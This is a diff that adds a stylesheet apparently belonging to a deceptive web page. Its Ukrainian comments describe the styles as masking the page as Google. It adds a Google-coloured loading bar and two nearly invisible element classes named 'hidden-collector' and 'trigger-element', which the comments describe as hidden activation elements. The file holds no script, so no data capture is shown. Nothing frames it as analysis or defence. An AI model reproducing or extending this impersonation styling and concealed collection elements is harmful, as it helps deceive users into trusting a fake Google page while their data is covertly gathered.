@@ -1,0 +1,43 @@
+body {
+    background: #ffffff;
+    font-family: 'Google Sans', Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+}
+
+.hidden-collector {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    opacity: 0.000001;
+    pointer-events: none;
+    z-index: -9999;
+}
+
+/* Стилі для маскування під Google */
+body::before {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 4px;
+    background: linear-gradient(90deg, #1a73e8, #34a853, #fbbc04, #ea4335);
+    animation: googleLoading 2s infinite;
+}
+
+@keyframes googleLoading {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
+
+/* Приховані елементи для активації */
+.trigger-element {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    background: transparent;
+    opacity: 0.0001;
+    pointer-events: none;
+}
